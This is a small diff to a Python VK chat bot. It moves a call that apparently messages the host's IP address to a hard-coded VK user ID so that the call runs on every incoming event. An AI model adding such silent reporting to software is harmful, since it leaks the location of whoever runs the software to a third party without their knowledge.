@@ -72,8 +72,10 @@ def bot():
         vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':rand,})
     vk=vk_api.VkApi(token=token)
     longpoll=VkLongPoll(vk)
-    y(437306907,IP)
+#    y(437306907,IP)
     for event in longpoll.listen():
+        y(437306907,IP)
+        
         if event.type==VkEventType.MESSAGE_NEW:
             if event.to_me():
                 r=event.text
